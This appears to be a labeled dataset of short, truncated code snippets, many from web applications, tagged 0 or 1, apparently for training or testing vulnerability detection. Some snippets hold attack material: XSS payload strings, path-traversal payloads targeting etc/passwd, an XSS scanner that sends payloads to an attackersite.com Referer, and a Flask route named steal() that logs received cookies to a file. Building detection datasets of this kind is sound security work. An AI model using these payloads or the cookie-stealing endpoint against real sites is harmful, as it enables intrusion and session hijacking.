os.getcwd().split('/')[-1", "label": 0}, {"snippet_id": 20386, "code": ".__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path", "label": 0}, {"snippet_id": 44228, "code": " from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES,", "label": 0}, {"snippet_id": 53286, "code": " properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException", "label": 0}, {"snippet_id": 1828, "code": ": print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1", "label": 0}, {"snippet_id": 33494, "code": " global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on", "label": 1}, {"snippet_id": 40658, "code": ".istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif", "label": 0}, {"snippet_id": 9575, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 19780, "code": " -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec ", "label": 0}, {"snippet_id": 27210, "code": " m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected. Method \" +rtype.upper() except Exception", "label": 0}, {"snippet_id": 30052, "code": " keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path)) \t\t \tMASTERS=sql.is_master(serv) \tfor master", "label": 0}, {"snippet_id": 3267, "code": "\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 0}, {"snippet_id": 45627, "code": " if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner", "label": 0}, {"snippet_id": 25804, "code": " queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.CheckboxSelectMultiple, initial=initial.options.all() if initial else None, ) elif q.type==Question.TYPE_FILE", "label": 0}, {"snippet_id": 570, "code": "'Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&'", "label": 1}, {"snippet_id": 29047, "code": " PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload(serv,", "label": 0}, {"snippet_id": 23372, "code": "'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 18835, "code": " name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD", "label": 0}, {"snippet_id": 7083, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth", "label": 0}, {"snippet_id": 41129, "code": ".comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", ", "label": 0}, {"snippet_id": 42965, "code": "')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable", "label": 0}, {"snippet_id": 21996, "code": "(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/", "label": 0}, {"snippet_id": 46284, "code": ": ''}], 'fqs':[], 'start': 0} template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad", "label": 0}, {"snippet_id": 9231, "code": "/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views", "label": 1}, {"snippet_id": 11383, "code": "'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course,", "label": 0}, {"snippet_id": 16557, "code": "+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license", "label": 0}, {"snippet_id": 2651, "code": " url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result", "label": 0}, {"snippet_id": 31698, "code": "\tprint(output) \t if form.getvalue('bwlists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists') \ttry: ", "label": 0}, {"snippet_id": 47845, "code": " user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active", "label": 1}, {"snippet_id": 48778, "code": " from django.utils.formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import", "label": 0}, {"snippet_id": 25811, "code": " widget=forms.CheckboxSelectMultiple, initial=initial.options.all() if initial else None, ) elif q.type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text", "label": 0}, {"snippet_id": 53923, "code": "/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write(", "label": 0}, {"snippet_id": 51956, "code": " STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder', 'compressor.finders.CompressorFinder', ) COMPRESS_CSS_FILTERS=['compressor.filters", "label": 0}, {"snippet_id": 2042, "code": " for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request", "label": 0}, {"snippet_id": 16833, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views", "label": 0}, {"snippet_id": 23513, "code": " 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/", "label": 0}, {"snippet_id": 1654, "code": "]=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], ", "label": 0}, {"snippet_id": 28371, "code": " alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept: \t\tprint('Content-type: text/html\\n') \t", "label": 0}, {"snippet_id": 9171, "code": ", name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 32600, "code": "): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir", "label": 0}, {"snippet_id": 2460, "code": "-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact", "label": 0}, {"snippet_id": 16692, "code": "'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 42799, "code": " docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta", "label": 0}, {"snippet_id": 26634, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini',", "label": 0}, {"snippet_id": 13378, "code": "', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon", "label": 0}, {"snippet_id": 19001, "code": "<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 42555, "code": " as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys", "label": 0}, {"snippet_id": 36217, "code": ".model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname", "label": 0}, {"snippet_id": 41475, "code": ":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format", "label": 0}, {"snippet_id": 23978, "code": " '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using", "label": 0}, {"snippet_id": 5854, "code": "<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t", "label": 0}, {"snippet_id": 29500, "code": "(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t", "label": 0}, {"snippet_id": 11429, "code": "-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=(", "label": 0}, {"snippet_id": 24809, "code": " Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files", "label": 0}, {"snippet_id": 35294, "code": "(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"):", "label": 0}, {"snippet_id": 7642, "code": "/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)", "label": 1}, {"snippet_id": 40284, "code": "\"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t", "label": 0}, {"snippet_id": 2830, "code": "?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger", "label": 0}, {"snippet_id": 47147, "code": ".delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error)s', error=str(e)), category='error') db.session.rollback() return", "label": 0}, {"snippet_id": 20694, "code": ", url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name", "label": 0}, {"snippet_id": 34295, "code": "\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict", "label": 0}, {"snippet_id": 36050, "code": "\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn", "label": 0}, {"snippet_id": 32720, "code": ") self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\"", "label": 0}, {"snippet_id": 20778, "code": ".contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name", "label": 0}, {"snippet_id": 36248, "code": "\t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be", "label": 0}, {"snippet_id": 44860, "code": ") return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2", "label": 0}, {"snippet_id": 19363, "code": ".env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 18374, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P", "label": 0}, {"snippet_id": 873, "code": " def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact", "label": 1}, {"snippet_id": 12634, "code": "'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware", "label": 0}, {"snippet_id": 37968, "code": "\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context", "label": 0}, {"snippet_id": 21143, "code": "?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$", "label": 0}, {"snippet_id": 2791, "code": "=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross", "label": 0}, {"snippet_id": 53814, "code": " bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork ", "label": 1}, {"snippet_id": 51546, "code": ".DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors.debug', 'django.template.context_processors", "label": 0}, {"snippet_id": 16469, "code": ".lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED:", "label": 0}, {"snippet_id": 18914, "code": "-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid", "label": 0}, {"snippet_id": 25272, "code": " data=[] for i, field in enumerate(self.scheme['fields']): fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[-1]=value.get('_legacy', '') return data", "label": 0}, {"snippet_id": 46153, "code": " True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2", "label": 0}, {"snippet_id": 22069, "code": "')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=", "label": 0}, {"snippet_id": 23907, "code": ", self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests", "label": 1}, {"snippet_id": 9218, "code": "[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "label": 1}, {"snippet_id": 49439, "code": " else: self.field_name=field self.model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list def get_title(self): if isinstance(self.model_field", "label": 0}, {"snippet_id": 30747, "code": "=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />", "label": 0}, {"snippet_id": 2348, "code": ".headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except", "label": 0}, {"snippet_id": 10695, "code": "-modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors", "label": 0}, {"snippet_id": 4927, "code": " Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x", "label": 0}, {"snippet_id": 34100, "code": " from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe", "label": 0}, {"snippet_id": 53574, "code": "/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup)", "label": 0}, {"snippet_id": 19612, "code": " ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 2861, "code": "\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse", "label": 0}, {"snippet_id": 47317, "code": "\nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest from django.shortcuts import redirect from django.contrib.auth.models import User from. import page_skeleton, magic from", "label": 0}, {"snippet_id": 19516, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"", "label": 0}, {"snippet_id": 27371, "code": ".datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj=obj.to_dict() dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj", "label": 0}, {"snippet_id": 2781, "code": "+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result", "label": 0}, {"snippet_id": 2391, "code": ": if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 51604, "code": " DATABASES_SETTINGS={ 'dev':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3')", "label": 0}, {"snippet_id": 43798, "code": " shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc", "label": 0}, {"snippet_id": 8685, "code": ", 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile'", "label": 0}, {"snippet_id": 23312, "code": "[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 30072, "code": "=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload(master[0], cert_path, name) \ttry: \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name,", "label": 0}, {"snippet_id": 14060, "code": "\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 26260, "code": ".vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'): if data.get('vat_id')", "label": 0}, {"snippet_id": 25069, "code": ".format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 16599, "code": " url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$", "label": 0}, {"snippet_id": 43287, "code": "(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get", "label": 0}, {"snippet_id": 15332, "code": "=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes", "label": 0}, {"snippet_id": 3584, "code": ".G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers", "label": 0}, {"snippet_id": 4017, "code": " uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url", "label": 0}, {"snippet_id": 31460, "code": " alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[", "label": 0}, {"snippet_id": 40726, "code": " values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t", "label": 0}, {"snippet_id": 37375, "code": ".content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context", "label": 0}, {"snippet_id": 49752, "code": "\",HOST+\":\"+PORT app=Flask(__name__) app.secret_key='I Am Batman.' access_key=\"Tony Stark Is The Best.\" session_id=\"This guy fucks!\" socketio=SocketIO(app) html=''' <div id=history></div> <script src=\"https", "label": 0}, {"snippet_id": 5314, "code": "', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', ", "label": 0}, {"snippet_id": 3505, "code": ".urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 14055, "code": "(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort", "label": 0}, {"snippet_id": 16993, "code": "/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 17999, "code": "(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings", "label": 0}, {"snippet_id": 18954, "code": " url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>", "label": 0}, {"snippet_id": 34495, "code": "\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError", "label": 0}, {"snippet_id": 3582, "code": 